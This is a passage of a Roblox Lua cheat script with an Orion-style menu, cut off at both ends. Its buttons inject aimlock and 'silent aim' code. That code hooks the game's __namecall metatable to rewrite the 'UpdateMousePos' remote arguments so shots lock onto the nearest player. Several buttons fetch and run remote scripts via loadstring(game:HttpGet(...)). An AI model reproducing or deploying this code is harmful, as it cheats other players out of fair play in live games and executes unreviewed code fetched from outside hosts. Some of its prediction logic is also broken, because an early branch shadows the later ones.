        Color = Color3.fromRGB(128, 0, 128),
        Size = Vector3.new(0.9, 1.2, 0.9)
    }
}






local CurrentCamera = game:GetService "Workspace".CurrentCamera
local Mouse = game.Players.LocalPlayer:GetMouse()
local RunService = game:GetService("RunService")
local Plr = game.Players.LocalPlayer

local Part = Instance.new("Part", game.Workspace)
Part.Anchored = true
Part.CanCollide = false
Part.Parent = game.Workspace
Part.Shape = Enum.PartType.Ball
Part.Size = settings.Dot.Size
Part.Color = settings.Dot.Color

if settings.Dot.Show == true then
    Part.Transparency = 0
else
    Part.Transparency = 1
end

Mouse.KeyDown:Connect(function(KeyPressed)
    if KeyPressed == (settings.main.Key) then
        if settings.main.DotEnabled == true then
            settings.main.DotEnabled = false
            if settings.main.Notifications == true then
                Plr = FindClosestUser()
                game.StarterGui:SetCore("SendNotification", {
                    Title = "Private Script",
                    Text = "No longer locked on"
                })
            end
        else
            Plr = FindClosestUser()
            settings.main.DotEnabled = true
            if settings.main.Notifications == true then
                game.StarterGui:SetCore("SendNotification", {
                    Title = "Private Script",
                    Text = "Locked on to:" .. tostring(Plr.Character.Humanoid.DisplayName)
                })
            end
        end
    end
end)

function FindClosestUser()
    local closestPlayer
    local shortestDistance = math.huge

    for i, v in pairs(game.Players:GetPlayers()) do
        if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and
            v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") then
            local pos = CurrentCamera:WorldToViewportPoint(v.Character.PrimaryPart.Position)
            local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(Mouse.X, Mouse.Y)).magnitude
            if magnitude < shortestDistance then
                closestPlayer = v
                shortestDistance = magnitude
            end
        end
    end
    return closestPlayer
end

RunService.Stepped:connect(function()
    if settings.main.DotEnabled and Plr.Character and Plr.Character:FindFirstChild("LowerTorso") then
        Part.CFrame = CFrame.new(Plr.Character[settings.main.Part].Position +
                                     (Plr.Character.LowerTorso.Velocity * settings.main.Prediction))
    else
        Part.CFrame = CFrame.new(0, 9999, 0)

    end
end)

local mt = getrawmetatable(game)
local old = mt.__namecall
setreadonly(mt, false)
mt.__namecall = newcclosure(function(...)
    local args = {...}
    if settings.main.DotEnabled and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
        args[3] = Plr.Character[settings.main.Part].Position +
                      (Plr.Character[settings.main.Part].Velocity * settings.main.Prediction)
        return old(unpack(args))
    end
    return old(...)
end)


if settings.main.AirshotFunc == true then
    if Plr.Character.Humanoid.Jump == true and Plr.Character.Humanoid.FloorMaterial == Enum.Material.Air then
        settings.main.Part = "RightFoot"
    else
        Plr.Character:WaitForChild("Humanoid").StateChanged:Connect(function(old,new)
            if new == Enum.HumanoidStateType.Freefall then
                settings.main.Part = "RightFoot"
            else
                settings.main.Part = "LowerTorso"
            end
        end)
    end
end
end
})
DotSec:AddButton({
	Name = "Pink dot V2 (Q)",
	Callback = function()
	 
	 OrionLib:MakeNotification({
	Name = "Injected successfully!",
	Content = "Injected script.",
	Image = "rbxassetid://4483345998",
	Time = 3
})
	 
	 
	 --[[


 XDLOOOOOOOOOOOOOOOOOOOOOOOOOOL ASTRO
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚══╝╚══╝ 
 
 ]]

 local CC = game:GetService"Workspace".CurrentCamera
    local Plr
    local enabled = false
    local accomidationfactor = 0.127
    local mouse = game.Players.LocalPlayer:GetMouse()
    local placemarker = Instance.new("Part", game.Workspace)

    function makemarker(Parent, Adornee, Color, Size, Size2)
        local e = Instance.new("BillboardGui", Parent)
        e.Name = "PP"
        e.Adornee = Adornee
        e.Size = UDim2.new(Size, Size2, Size, Size2)
        e.AlwaysOnTop = true
        local a = Instance.new("Frame", e)
        a.Size = UDim2.new(1, 0, 1, 0)
        a.BackgroundTransparency = 0
        a.BackgroundColor3 = Color
        local g = Instance.new("UICorner", a)
        g.CornerRadius = UDim.new(50, 50)
        return(e)
    end

    
    local data = game.Players:GetPlayers()
    function noob(player)
        local character
        repeat wait() until player.Character
        local handler = makemarker(guimain, player.Character:WaitForChild("HumanoidRootPart"), Color3.fromRGB(107, 184, 255), 0.3, 3)
        handler.Name = player.Name
        player.CharacterAdded:connect(function(Char) handler.Adornee = Char:WaitForChild("HumanoidRootPart") end)


        spawn(function()
            while wait() do
                if player.Character then
                    TextLabel.Text = player.Name..tostring(player:WaitForChild("leaderstats").Wanted.Value).." | "..tostring(math.floor(player.Character:WaitForChild("Humanoid").Health))
                end
            end
        end)
    end

    for i = 1, #data do
        if data[i] ~= game.Players.LocalPlayer then
            noob(data[i])
        end
    end

    game.Players.PlayerAdded:connect(function(Player)
        noob(Player)
    end)

    spawn(function()
        placemarker.Anchored = true
        placemarker.CanCollide = false
        placemarker.Size = Vector3.new(7, 7, 7)
        placemarker.Transparency = 1
        makemarker(placemarker, placemarker, Color3.fromRGB(255, 183, 197), 0.40, 0)
    end)    

mouse.KeyDown:Connect(function(k)
    if k ~= "q" then return end
    if enabled then
        enabled = false
        guimain[Plr.Name].Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    else
        enabled = true 
        Plr = getClosestPlayerToCursor()
        guimain[Plr.Name].Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    end    
end)

    function getClosestPlayerToCursor()
        local closestPlayer
        local shortestDistance = math.huge

        for i, v in pairs(game.Players:GetPlayers()) do
            if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("LowerTorso") then
                local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
                local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(mouse.X, mouse.Y)).magnitude
                if magnitude < shortestDistance then
                    closestPlayer = v
                    shortestDistance = magnitude
                end
            end
        end
        return closestPlayer
    end

    game:GetService"RunService".Stepped:connect(function()
        if enabled and Plr.Character and Plr.Character:FindFirstChild("HumanoidRootPart") then
            placemarker.CFrame = CFrame.new(Plr.Character.UpperTorso.Position+(Plr.Character.UpperTorso.Velocity*accomidationfactor))
        else
            placemarker.CFrame = CFrame.new(0, 9999, 0)
        end
    end)

    local mt = getrawmetatable(game)
    local old = mt.__namecall
    setreadonly(mt, false)
    mt.__namecall = newcclosure(function(...)
        local args = {...}
        if enabled and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
            args[3] = Plr.Character.UpperTorso.Position+(Plr.Character.UpperTorso.Velocity*accomidationfactor)
            return old(unpack(args))
        end
        return old(...)
    end)

end
})
DotSec:AddButton({
	Name = "Hulkware dot (Q)",
	Callback = function()

	OrionLib:MakeNotification({
	Name = "Injected successfully!",
	Content = "Injected script.",
	Image = "rbxassetid://4483345998",
	Time = 3
})




 Settings = {
    rewrittenmain = {
    Enabled = true,
    Key = "q",
    DOT = true,
    AIRSHOT = true,
    NOTIF = true,
    AUTOPRED = false,
    FOV = math.huge,
    RESOVLER = false
}
}

local SelectedPart = "HumanoidRootPart"
local Prediction = true
_G.PredictionValue = 0.1


local AnchorCount = 0
local MaxAnchor = 50

local CC = game:GetService"Workspace".CurrentCamera
local Plr;
local enabled = false
local accomidationfactor = 0.1
local mouse = game.Players.LocalPlayer:GetMouse()

local Inset = game:GetService("GuiService"):GetGuiInset().Y
local Line = Drawing.new("Line")
local Text = Drawing.new("Text")
local Circle = Drawing.new("Circle")


_G.Types = {
    Ball = Enum.PartType.Ball,
    Block = Enum.PartType.Block, 
    Cylinder = Enum.PartType.Cylinder
}
                  
                  local placemarker = Instance.new("Part", game.Workspace)
                  placemarker.Shape = _G.Types.Ball
                  placemarker.Material = "ForceField"
                  placemarker.Color = Color3.new(120, 6, 213)


function makemarker(Parent, Adornee, Color, Size, Size2)
    local e = Instance.new("BillboardGui", Parent)
    e.Name = "PP"
    e.Adornee = Adornee
    e.Size = UDim2.new(Size, Size2, Size, Size2)
    e.AlwaysOnTop = Settings.rewrittenmain.DOT
    local a = Instance.new("Frame", e)
    if Settings.rewrittenmain.DOT == true then
    a.Size = UDim2.new(1, 0, 1, 0)
    else
    a.Size = UDim2.new(0, 0, 0, 0)
    end
    if Settings.rewrittenmain.DOT == true then
    a.Transparency = 0
    a.BackgroundTransparency = 0
    else
    a.Transparency = 1
    a.BackgroundTransparency = 1
    end
    a.BackgroundColor3 = Color
    local g = Instance.new("UICorner", a)
    if Settings.rewrittenmain.DOT == false then
    g.CornerRadius = UDim.new(0, 0)
    else
    g.CornerRadius = UDim.new(1, 1) 
    end
    return(e)
end


local data = game.Players:GetPlayers()
function noob(player)
    local character
    repeat wait() until player.Character
    local handler = makemarker(guimain, player.Character:WaitForChild(SelectedPart), Color3.fromRGB(120, 6, 213), 0.3, 3)
    handler.Name = player.Name
    player.CharacterAdded:connect(function(Char) handler.Adornee = Char:WaitForChild(SelectedPart) end)


    spawn(function()
        while wait() do
            if player.Character then
            end
        end
    end)
end

for i = 1, #data do
    if data[i] ~= game.Players.LocalPlayer then
        noob(data[i])
    end
end

game.Players.PlayerAdded:connect(function(Player)
    noob(Player)
end)

spawn(function()
    placemarker.Anchored = true
    placemarker.CanCollide = false
    if Settings.rewrittenmain.DOT == true then
    placemarker.Size = Vector3.new(8, 8, 8)
    else
    placemarker.Size = Vector3.new(0, 0, 0)
    end
    placemarker.Transparency = 0.50
    if Settings.rewrittenmain.DOT then
    makemarker(placemarker, placemarker, Color3.fromRGB(120, 6, 213), 0.40, 0)
    end
end)

game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
    if k == Settings.rewrittenmain.Key and Settings.rewrittenmain.Enabled then
        if enabled == true then
            enabled = false
            if Settings.rewrittenmain.NOTIF == true then
                Plr = getClosestPlayerToCursor()
            game.StarterGui:SetCore("SendNotification", {
                Title = "hulkware";
                Text = "Unlocked",
                Duration = 3
            })
        end
        else
            Plr = getClosestPlayerToCursor()
            enabled = true
            if Settings.rewrittenmain.NOTIF == true then

                game.StarterGui:SetCore("SendNotification", {
                    Title = "hulkware";
                    Text = "Target: "..tostring(Plr.Character.Humanoid.DisplayName),
                    Duration = 3
                })

            end
        end
    end
end)



function getClosestPlayerToCursor()
    local closestPlayer
    local shortestDistance = Settings.rewrittenmain.FOV

    for i, v in pairs(game.Players:GetPlayers()) do
        if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") then
            local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
            local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(mouse.X, mouse.Y)).magnitude
            if magnitude < shortestDistance then
                closestPlayer = v
                shortestDistance = magnitude
            end
        end
    end
    return closestPlayer
end

local pingvalue = nil;
local split = nil;
local ping = nil;

game:GetService"RunService".Stepped:connect(function()
    if enabled and Plr.Character ~= nil and Plr.Character:FindFirstChild("HumanoidRootPart") then
        placemarker.CFrame = CFrame.new(Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*accomidationfactor))
                        local Vector1 = CC:WorldToViewportPoint(Plr.Character.HumanoidRootPart.Position)
        Line.Color = Color3.fromRGB(120, 6, 214)
            Line.Transparency = 1
            Line.Thickness = 1
            Line.From = Vector2.new(mouse.X, mouse.Y + Inset)
            Line.To = Vector2.new(Vector1.X, Vector1.Y)
            Line.Visible = true
            Text.Position = Vector2.new(mouse.X, mouse.Y + Inset)
            Text.Visible = false
            Text.Center = true
            Text.Outline = true
            Text.Font = 1
            Text.Size = 35
            Text.Color = Color3.fromRGB(120, 6, 213)
            Text.Text = "gg ez fuck you"
            Circle.Position = Vector2.new(mouse.X, mouse.Y + Inset)
            Circle.Visible = false
            Circle.Thickness = 1.5
            Circle.Thickness = 2
            Circle.Radius = 325
            Circle.Color = Color3.fromRGB(120, 6, 213)
    else
                        Circle.Visible = false
            Line.Visible = false
            Text.Visible = false
        placemarker.CFrame = CFrame.new(0, 9999, 0)
    end
    if Settings.rewrittenmain.AUTOPRED == true then
         pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
         split = string.split(pingvalue,'(')
         ping = tonumber(split[1])
        if ping < 130 then
            PredictionValue = 0.151
        elseif ping < 125 then
            PredictionValue = 0.149
        elseif ping < 110 then
            PredictionValue = 0.146
        elseif ping < 105 then
            PredictionValue = 0.138
        elseif ping < 90 then
            PredictionValue = 0.136
        elseif ping < 80 then
            PredictionValue = 0.134
        elseif ping < 70 then
            PredictionValue = 0.131
        elseif ping < 60 then
            PredictionValue = 0.1229
        elseif ping < 50 then
            PredictionValue = 0.1225
        elseif ping < 40 then
            PredictionValue = 0.1256
        end
    end
end)

local mt = getrawmetatable(game)
local old = mt.__namecall
setreadonly(mt, false)
mt.__namecall = newcclosure(function(...)
    local args = {...}
    if enabled and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" and Settings.rewrittenmain.Enabled and Plr.Character ~= nil then

        -- args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*accomidationfactor)
        --[[
        if Settings.rewrittenmain.AIRSHOT == true then
            if game.Workspace.Players[Plr.Name].Humanoid:GetState() == Enum.HumanoidStateType.Freefall then -- Plr.Character:WaitForChild("Humanoid"):GetState() == Enum.HumanoidStateType.Freefall
                
                --// Airshot
                args[3] = Plr.Character.LeftFoot.Position+(Plr.Character.LeftFoot.Velocity*PredictionValue)

            else
                args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*PredictionValue)

            end
        else
                args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*PredictionValue)
        end
        ]]
        if Prediction == true then
            
        args[3] = Plr.Character[SelectedPart].Position+(Plr.Character[SelectedPart].Velocity*PredictionValue)

        else

        args[3] = Plr.Character[SelectedPart].Position

        end

        return old(unpack(args))
    end
    return old(...)
end)

game:GetService("RunService").RenderStepped:Connect(function()
    if Settings.rewrittenmain.RESOVLER == true and Plr.Character ~= nil and enabled and Settings.rewrittenmain.Enabled then
    if Settings.rewrittenmain.AIRSHOT == true and enabled and Plr.Character ~= nil then
        
        if game.Workspace.Players[Plr.Name].Humanoid:GetState() == Enum.HumanoidStateType.Freefall then -- Plr.Character:WaitForChild("Humanoid"):GetState() == Enum.HumanoidStateType.Freefall
            
            --// Airshot

            --// Anchor Check

            if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                AnchorCount = AnchorCount + 1
                if AnchorCount >= MaxAnchor then
                    Prediction = false
                    wait(2)
                    AnchorCount = 0;
                end
            else
                Prediction = true
                AnchorCount = 0;
            end

            SelectedPart = "LeftFoot"

        else
            --// Anchor Check

            if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                AnchorCount = AnchorCount + 1
                if AnchorCount >= MaxAnchor then
                    Prediction = false
                    wait(2)
                    AnchorCount = 0;
                end
            else
                Prediction = true
                AnchorCount = 0;
            end

            SelectedPart = "HumanoidRootPart"

        end
        else

            --// Anchor Check

            if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                AnchorCount = AnchorCount + 1
                if AnchorCount >= MaxAnchor then
                    Prediction = false
                    wait(2)
                    AnchorCount = 0;
                end
            else
                Prediction = true
                AnchorCount = 0;
            end

            SelectedPart = "HumanoidRootPart"
        end

    else
            SelectedPart = "HumanoidRootPart"
    end
end)
		end
})
DotSec:AddButton({
	Name = "Green dot ",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/ByteGX/Main/main/green_dot-2.txt"))()
		end
})
DotSec:AddButton({
	Name = "Red dot",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/ByteGX/Main/main/red_dot_-oplicine.lua-1.txt"))()
		end
})
DotSec:AddButton({
	Name = "Purple dot",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/ByteGX/Main/main/purple_dot-1.txt"))()
		end
})
DotSec:AddButton({
	Name = "Yellow dot",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/ByteGX/Main/main/yellow_dot.txt"))()
	end
})
DotSec:AddButton({
	Name = "White dot",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/ByteGX/Main/main/white_dot.lua.txt"))()
	end
})












DotSec:AddLabel("Will be updated as the script grows.")

--•┃Camlock aiming tab┃•-- Working Completed/Still adding things


local Cam = Window:MakeTab({
	Name = "Camlock",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local CamSec = Cam:AddSection({
	Name = "Camlock aiming"
})
CamSec:AddButton({
	Name = "Evan's camlock ( Q. )",
	Callback = function()

	OrionLib:MakeNotification({
	Name = "Injected successfully!",
	Content = "Injected script.",
	Image = "rbxassetid://4483345998",
	Time = 3
})







	--[[
 
██╗  ██╗ █████╗ ██████╗ ██╗    ██╗    ██╗
██║ ██╔╝██╔══██╗██╔══██╗██║    ██║    ██║
█████╔╝ ███████║██████╔╝██║    ██║ █╗ ██║
██╔═██╗ ██╔══██║██╔══██╗██║    ██║███╗██║
██║  ██╗██║  ██║██║  ██║██████╗╚███╔███╔╝
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚══╝╚══╝ 
 
--]]
 
--dont mess with he settings unless u know what ur doing
 
local Settings = {
    rewrittenmain = {
        Enabled = true,
        Key = "q",
        DOT = true,
        AIRSHOT = true,
        NOTIF = true, 
        AUTOPRED = true, 
        FOV = math.huge,
        RESOVLER = false 
    }
}
 
local SelectedPart = "UpperTorso"                              
local Prediction = true
local PredictionValue = 0.1259910                            
 
 
    local AnchorCount = 0
    local MaxAnchor = 50
 
    local CC = game:GetService"Workspace".CurrentCamera
    local Plr;
    local enabled = false
    local accomidationfactor = 0.12348
    local mouse = game.Players.LocalPlayer:GetMouse()
    local placemarker = Instance.new("Part", game.Workspace)
 
    function makemarker(Parent, Adornee, Color, Size, Size2)
        local e = Instance.new("BillboardGui", Parent)
        e.Name = "PP"
        e.Adornee = Adornee
        e.Size = UDim2.new(Size, Size2, Size, Size2)
        e.AlwaysOnTop = Settings.rewrittenmain.DOT
        local a = Instance.new("Frame", e)
        if Settings.rewrittenmain.DOT == true then
        a.Size = UDim2.new(2, 2, 2)
        else
        a.Size = UDim2.new(0, 0, 0, 0)
        end
        if Settings.rewrittenmain.DOT == true then
        a.Transparency = 0
        a.BackgroundTransparency = 0
        else
        a.Transparency = 1
        a.BackgroundTransparency = 1
        end
        a.BackgroundColor3 = Color
        local g = Instance.new("UICorner", a)
        if Settings.rewrittenmain.DOT == false then
        g.CornerRadius = UDim.new(0, 0)
        else
        g.CornerRadius = UDim.new(1, 1)
        end
        return(e)
    end
 
 
    local data = game.Players:GetPlayers()
    function noob(player)
        local character
        repeat wait() until player.Character
        local handler = makemarker(guimain, player.Character:WaitForChild(SelectedPart), Color3.fromRGB(68, 214, 44), 0.3, 3)
        handler.Name = player.Name
        player.CharacterAdded:connect(function(Char) handler.Adornee = Char:WaitForChild(SelectedPart) end)
 
 
        spawn(function()                                    
            while wait() do                                     
                if player.Character then                                    
                end                                    
            end                                     
        end)                                    
    end                                    
 
    for i = 1, #data do
        if data[i] ~= game.Players.LocalPlayer then
            noob(data[i])
        end
    end
 
    game.Players.PlayerAdded:connect(function(Player)
        noob(Player)
    end)
 
    spawn(function()
        placemarker.Anchored = true
        placemarker.CanCollide = false
        if Settings.rewrittenmain.DOT == true then
        placemarker.Size = Vector3.new(6, 6, 6)
        else
        placemarker.Size = Vector3.new(0, 0, 0)
        end
        placemarker.Transparency = 1
        if Settings.rewrittenmain.DOT then
        makemarker(placemarker, placemarker, Color3.fromRGB(68, 214, 44), 0.40, 0)
        end
    end)
 
    game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
        if k == Settings.rewrittenmain.Key and Settings.rewrittenmain.Enabled then
            if enabled == true then
                enabled = false
                if Settings.rewrittenmain.NOTIF == true then
                    Plr = getClosestPlayerToCursor()
                game.StarterGui:SetCore("SendNotification", {
						Title = "Lock Notification",
						Text = "Unlocked",
						Icon = "",
						Duration = 1,
})
            end
            else
                Plr = getClosestPlayerToCursor()
                enabled = true
                if Settings.rewrittenmain.NOTIF == true then
 
                    game.StarterGui:SetCore("SendNotification", {
						Title = "Lock Notification",
						Text = "Locked On :"..tostring(Plr.Name); 
						Icon = "",
						Duration = 1,
})
 
                end
            end
        end
    end)
 
 
 
    function getClosestPlayerToCursor()
        local closestPlayer
        local shortestDistance = Settings.rewrittenmain.FOV
 
        for i, v in pairs(game.Players:GetPlayers()) do
            if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") then
                local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
                local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(mouse.X, mouse.Y)).magnitude
                if magnitude < shortestDistance then
                    closestPlayer = v
                    shortestDistance = magnitude
                end
            end
        end
        return closestPlayer
    end
 
    local pingvalue = nil;
    local split = nil;
    local ping = nil;
 
    game:GetService"RunService".Stepped:connect(function()
        if enabled and Plr.Character ~= nil and Plr.Character:FindFirstChild("HumanoidRootPart") then
            placemarker.CFrame = CFrame.new(Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*accomidationfactor))
        else
            placemarker.CFrame = CFrame.new(0, 9999, 0)
        end
        if Settings.rewrittenmain.AUTOPRED == true then
             pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
             split = string.split(pingvalue,'(')
             ping = tonumber(split[1])
            if ping < 130 then
                PredictionValue = 0.151
            elseif ping < 125 then
                PredictionValue = 0.149
            elseif ping < 110 then
                PredictionValue = 0.146
            elseif ping < 105 then
                PredictionValue = 0.138
            elseif ping < 90 then
                PredictionValue = 0.136
            elseif ping < 80 then
                PredictionValue = 0.134
            elseif ping < 70 then
                PredictionValue = 0.131
            elseif ping < 60 then
                PredictionValue = 0.1229
            elseif ping < 50 then
                PredictionValue = 0.1225
            elseif ping < 40 then
                PredictionValue = 0.1256
            end
        end
    end)
 
    local mt = getrawmetatable(game)
    local old = mt.__namecall
    setreadonly(mt, false)
    mt.__namecall = newcclosure(function(...)
        local args = {...}
        if enabled and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" and Settings.rewrittenmain.Enabled and Plr.Character ~= nil then
 
            -- args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*accomidationfactor)
            --[[
            if Settings.rewrittenmain.AIRSHOT == true then
                if game.Workspace.Players[Plr.Name].Humanoid:GetState() == Enum.HumanoidStateType.Freefall then -- Plr.Character:WaitForChild("Humanoid"):GetState() == Enum.HumanoidStateType.Freefall
 
                    --// Airshot
                    args[3] = Plr.Character.LeftFoot.Position+(Plr.Character.LeftFoot.Velocity*PredictionValue)
                else
                    args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*PredictionValue)
                end
            else
                    args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*PredictionValue)
            end
            ]]
            if Prediction == true then
 
            args[3] = Plr.Character[SelectedPart].Position+(Plr.Character[SelectedPart].Velocity*PredictionValue)
 
            else
 
            args[3] = Plr.Character[SelectedPart].Position
 
            end
 
            return old(unpack(args))
        end
        return old(...)
    end)
 
    game:GetService("RunService").RenderStepped:Connect(function()
        if Settings.rewrittenmain.RESOVLER == true and Plr.Character ~= nil and enabled and Settings.rewrittenmain.Enabled then
        if Settings.rewrittenmain.AIRSHOT == true and enabled and Plr.Character ~= nil then
 
            if game.Workspace.Players[Plr.Name].Humanoid:GetState() == Enum.HumanoidStateType.Freefall then -- Plr.Character:WaitForChild("Humanoid"):GetState() == Enum.HumanoidStateType.Freefall
 
                --// Airshot
 
                --// Anchor Check
 
                if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                    AnchorCount = AnchorCount + 1
                    if AnchorCount >= MaxAnchor then
                        Prediction = false
                        wait(2)
                        AnchorCount = 0;
                    end
                else
                    Prediction = true
                    AnchorCount = 0;
                end
 
                SelectedPart = "HumanoidRootPart"
 
            else
                --// Anchor Check
 
                if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                    AnchorCount = AnchorCount + 1
                    if AnchorCount >= MaxAnchor then
                        Prediction = false
                        wait(2)
                        AnchorCount = 0;
                    end
                else
                    Prediction = true
                    AnchorCount = 0;
                end
 
                SelectedPart = "HumanoidRootPart"
 
            end
            else
 
                --// Anchor Check
 
                if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                    AnchorCount = AnchorCount + 1
                    if AnchorCount >= MaxAnchor then
                        Prediction = false
                        wait(2)
                        AnchorCount = 0;
                    end
                else
                    Prediction = true
                    AnchorCount = 0;
                end
 
                SelectedPart = "HumanoidRootPart"
            end
 
        else
                SelectedPart = "HumanoidRootPart"
        end
    end)
 
--the cam lock
 
getgenv().Prediction = 0.143105125985120958176	
getgenv().AimPart = "UpperTorso"	
getgenv().Key = "Q"	
getgenv().DisableKey = "P"	
 
getgenv().FOV = true	
getgenv().ShowFOV = false	
getgenv().FOVSize = 55	
 
--// Variables (Service)	
 
local Players = game:GetService("Players")	
local RS = game:GetService("RunService")	
local WS = game:GetService("Workspace")	
local GS = game:GetService("GuiService")	
local SG = game:GetService("StarterGui")	
 
--// Variables (regular)	
 
local LP = Players.LocalPlayer	
local Mouse = LP:GetMouse()	
local Camera = WS.CurrentCamera	
local GetGuiInset = GS.GetGuiInset	
 
local AimlockState = true	
local Locked	
local Victim	
 
local SelectedKey = getgenv().Key	
local SelectedDisableKey = getgenv().DisableKey	
 
--// Check if aimlock is loaded	
 
if getgenv().Loaded == true then	
    Notify("Aimlock is already loaded!")	
    return	
end	
 
getgenv().Loaded = true	
 
--// FOV Circle	
 
local fov = Drawing.new("Circle")	
fov.Filled = false	
fov.Transparency = 1	
fov.Thickness = 1	
fov.Color = Color3.fromRGB(255, 255, 0)	
fov.NumSides = 1000	
 
--// Functions	
 
function update()	
    if getgenv().FOV == true then	
        if fov then	
fov.Radius = getgenv().FOVSize * 2	
            fov.Visible = getgenv().ShowFOV	
fov.Position = Vector2.new(Mouse.X, Mouse.Y + GetGuiInset(GS).Y)	
 
            return fov	
        end	
    end	
end	
 
function WTVP(arg)	
    return Camera:WorldToViewportPoint(arg)	
end	
 
function WTSP(arg)	
    return Camera.WorldToScreenPoint(Camera, arg)	
end	
 
function getClosest()	
    local closestPlayer	
    local shortestDistance = math.huge	
 
    for i, v in pairs(game.Players:GetPlayers()) do	
        local notKO = v.Character:WaitForChild("BodyEffects")["K.O"].Value ~= true	
        local notGrabbed = v.Character:FindFirstChild("GRABBING_COINSTRAINT") == nil	
 
if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild(getgenv().AimPart) and notKO and notGrabbed then	
            local pos = Camera:WorldToViewportPoint(v.Character.PrimaryPart.Position)	
local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(Mouse.X, Mouse.Y)).magnitude	
 
            if (getgenv().FOV) then	
                if (fov.Radius > magnitude and magnitude < shortestDistance) then	
                    closestPlayer = v	
                    shortestDistance = magnitude	
                end	
            else	
                if (magnitude < shortestDistance) then	
                    closestPlayer = v	
                    shortestDistance = magnitude	
                end	
            end	
        end	
    end	
    return closestPlayer	
end	
 
--// Checks if key is down	
 
Mouse.KeyDown:Connect(function(k)	
    SelectedKey = SelectedKey:lower()	
    SelectedDisableKey = SelectedDisableKey:lower()	
    if k == SelectedKey then	
        if AimlockState == true then	
            Locked = not Locked	
            if Locked then	
                Victim = getClosest()	
 
                Notify("Locked onto: "..tostring(Victim.Character.Humanoid.DisplayName))	
            else	
                if Victim ~= nil then	
                    Victim = nil	
 
                    Notify("Unlocked!")	
                end	
            end	
        else	
            Notify("Aimlock is not enabled!")	
        end	
    end	
    if k == SelectedDisableKey then	
        AimlockState = not AimlockState	
    end	
end)	
 
--// Loop update FOV and loop camera lock onto target	
 
RS.RenderStepped:Connect(function()	
    update()	
    if AimlockState == true then	
        if Victim ~= nil then	
            Camera.CFrame = CFrame.new(Camera.CFrame.p, Victim.Character[getgenv().AimPart].Position + Victim.Character[getgenv().AimPart].Velocity*getgenv().Prediction)	
        end	
    end	
end)	
	while wait() do
        if getgenv().AutoPrediction == true then	
        local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()	
        local split = string.split(pingvalue,'(')	
local ping = tonumber(split[1])	
if ping < 225 then	
getgenv().Prediction = 1.4	
elseif ping < 215 then	
getgenv().Prediction = 1.2	
	elseif ping < 205 then
getgenv().Prediction = 1.0	
	elseif ping < 190 then
getgenv().Prediction = 0.10	
elseif ping < 180 then	
getgenv().Prediction = 0.12	
	elseif ping < 170 then
getgenv().Prediction = 0.15	
	elseif ping < 160 then
getgenv().Prediction = 0.18	
	elseif ping < 150 then
getgenv().Prediction = 0.110	
elseif ping < 140 then	
getgenv().Prediction = 0.113	
elseif ping < 130 then	
getgenv().Prediction = 0.116	
elseif ping < 120 then	
getgenv().Prediction = 0.120	
elseif ping < 110 then	
getgenv().Prediction = 0.124	
elseif ping < 105 then	
getgenv().Prediction = 0.127	
elseif ping < 90 then	
getgenv().Prediction = 0.130	
elseif ping < 80 then	
getgenv().Prediction = 0.133	
elseif ping < 70 then	
